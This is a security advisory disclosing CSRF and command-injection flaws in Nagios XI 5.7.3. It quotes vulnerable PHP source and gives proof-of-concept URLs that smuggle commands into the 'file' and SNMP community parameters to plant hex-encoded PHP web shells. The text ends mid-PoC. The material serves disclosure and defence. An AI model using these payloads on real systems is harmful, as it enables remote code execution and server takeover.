# Nagios XI Multiple Vulnerabilities

Medium

[← View More Research Advisories](/security/research)
### Synopsis

We have discovered multiple vulnerabilities in Nagios XI 5.7.3.

#### CVE-2020-5790: Cross-site Request Forgery

CVSS v3 Base Score: 4.3

CVSS v3 Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

Cross-site request forgery (CSRF) vulnerabilities exist in Nagios XI for various requests. While there is protection implemented via the Nagios Session Protector
in other parts of the application, it was found that protection is incomplete in the following:
- /nagiosxi/admin/mibs.php
- /nagiosxi/includes/components/nxti/index.php

CRSF can be exploited by a remote, unauthenticated attacker to execute sensitive application actions in the context of an authenticated user. This would likely be exploited via phishing or some other means to trick a legitimate Nagios user into clicking a malicious link.

For example, the mibs.php undo\_process\_single() function does not call check\_nagios\_session\_protector().

CSRF can be chained with other vulnerabilities in this report to gain remote code execution. Please see the PoC for vulnerability 2, as it exploits CSRF.

#### CVE-2020-5791: Authenticated OS Command Injection RCE in /nagiosxi/admin/mibs.php

CVSS v3 Base Score: 4.7

CVSS v3 Vector: AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

An OS command injection vulnerability exists in the admin/mibs.php file. A remote, authenticated attacker with admin privileges may exploit this vulnerability to execute arbitrary OS commands with privileges of the 'apache' user. Specifically, when the 'mode' HTTP parameter equals 'undo-processing' and the 'type' parameter equals 1, the 'file' parameter will ultimately be passed to the PHP exec() function without sanitization.

Below are code snippets to show this:

```

function route_request()
{
    global $request;

    $mode = '';
    if (isset($request['mode'])) {
        $mode = $request['mode'];
    }

    switch ($mode) {
        ...
        case 'undo-processing':
            undo_process_single();	// VULN
            break;
       ...
    }
...
}

function undo_process_single() {
    // Mode needs to be based on processing type of MIB, not on 'current' processing type

    $file = grab_request_var('file', '');
    $name = grab_request_var('name', '');
    $current_type = intval(grab_request_var('type', MIB_UPLOAD_DO_NOTHING));

    if ($current_type !== MIB_UPLOAD_PROCESS_ONLY && $current_type !== MIB_UPLOAD_NXTI) {
        show_mibs(false, _("No processing to be undone"));
    }

    undo_processing($file, $name, $current_type);	// VULN

    show_mibs(false, sprintf(_("Successfully reverted %s to 'uploaded' state"), $name));
}

function undo_processing($file, $name, $current_type) {

    if ($current_type !== MIB_UPLOAD_PROCESS_ONLY && $current_type !== MIB_UPLOAD_NXTI) {
        return;
    }

    $current_conf_path = get_processing_destination($current_type) . '/' . $file;

    remove_snmpttconvertmib_files(array($file));

    if ($current_type === MIB_UPLOAD_PROCESS_ONLY) {
        $get_event_names_cmd = get_root_dir() . "/scripts/nxti_import.php $current_conf_path --no-insert";
        exec($get_event_names_cmd, $all_events, $rc);	// VULN
        $all_events = array_unique($all_events);

        remove_from_snmptt_conf($all_events);
    }

    mibs_revert_db_entry($name);
}

```
#### Proof of Concept (PoC)

Attacker sends the following link to a Nagios XI Administrator:

```

http://192.168.1.178/nagiosxi/admin/mibs.php?mode=undo-processing&type=1&file=%3becho+-ne+"\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x20\x3f\x3e">/usr/local/nagiosxi/html/includes/components/autodiscovery/jobs/scooby.php

```

Once the admin clicks the link, scooby.php will be created, and the attacker can access the newly created PHP script to execute more commands. Notice 'apache' in the response.

```

http://192.168.1.178/nagiosxi/includes/components/autodiscovery/jobs/scooby.php?cmd=whoami

```
Response:
```

HTTP/1.1 200 OK

```
#### CVE-2020-5792: Authenticated OS Command Argument Injection Vulnerability Leading to Arbitrary File Write / RCE in /nagiosxi/includes/components/nxti/index.php

CVSS v3 Base Score: 4.7

CVSS v3 Vector: AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

An OS command argument injection vulnerability exists in the send\_custom\_trap() function in /nagiosxi/html/includes/components/nxti/index.php. Specifically, the $cmd variable is constructed by incorporating values from HTTP parameters. Prior to being passed to exec(), this command line is escaped using the PHP escapeshellcmd() function; however, this is insufficient, and an attacker is able to inject arbitrary arguments into the command. This vulnerability can be exploited by an authenticated attacker with admin rights to execute arbitrary code with privileges of the apache user.

In this case, the 'snmptrap' command is executed, and arguments can be injected to create a malicious PHP shell. For example, the -d flag will display the captured SNMP request made, and the output can be logged to a file using the -L flag. This causes a hexdump of the request to be logged to an arbitrary file location. Additionally, if variables are specified, the contents of the file can be crafted in such a way that a valid PHP shell is created. This shell could then be invoked using a subsequent web request to execute arbitrary OS commands.

Please note that this vulnerability can be exploited in combination with CSRF. If an administrator were to click the link, code execution could be gained by an unauthenticated, remote attacker.

#### Proof of Concept (PoC)

Send the following link to an authenticated Nagios XI administrator. Ensure the IP matches that of the target Nagios XI instance:

```

http://192.168.1.179/nagiosxi/includes/components/nxti/index.php?custom-version=2c&generic-trap-option=0&specific-trap-option=&custom-agent=&custom-community=a+-d+-L+f+/usr/local/nagiosxi/html/includes/components/autodiscovery/jobs/snmplog.php&custom-oid=NET-SNMP-EXAMPLES-MIB%3A%3AnetSnmpExampleHeartbeatNotification&variablebindings%5Bname%5D%5B%5D=x&variablebindings%5Btype%5D%5B%5D=x&variablebindings%5Bvalue%5D%5B%5D=3c3f706870202f2a2020202020202a2f73797374656d282f2a20202020202a2f245f4745545b2263225d292f2a202a2f3f3e&mode=customTrap

```

A file will then be created at /usr/local/nagiosxi/html/includes/components/autodiscovery/jobs/snmplog.php. It will contain the following contents. Note how the PHP can be crafted with multiline comments to ensure a valid PHP file is created. Additionally, input validation filters were bypassed using snmptrap's hexadecimal variable formatting. :

```
